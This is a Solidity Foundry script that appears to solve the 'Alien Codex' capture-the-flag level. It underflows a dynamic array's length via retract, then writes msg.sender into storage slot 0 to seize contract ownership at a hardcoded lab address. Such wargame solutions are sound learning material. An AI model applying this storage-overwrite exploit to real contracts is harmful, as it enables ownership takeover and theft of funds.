// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/Alien_Codex.sol";

interface AlienCodex {
    function makeContact() external;
    function record(bytes32 _content) external;
    function retract() external;
    function revise(uint256 i, bytes32 _content) external;
}

contract DeployTinyRuntime is Script {
    address public addr;
    uint256 public help;
    function run() external {
        vm.startBroadcast();

        addr = 0x5d21FdA3AfE4AC0C2757F7E0B2Fb626eEea15DB0;  
        AlienCodex alienCodex = AlienCodex(addr);
        alienCodex.makeContact();
        alienCodex.retract();

        uint256 arrayslotstart = uint256(keccak256(abi.encode(1)));
        
        help = 1;
        uint256 index = (2**256 - 1) - arrayslotstart + help;

        alienCodex.revise(index, bytes32(uint256(uint160(msg.sender))));

        vm.stopBroadcast();
    }
}
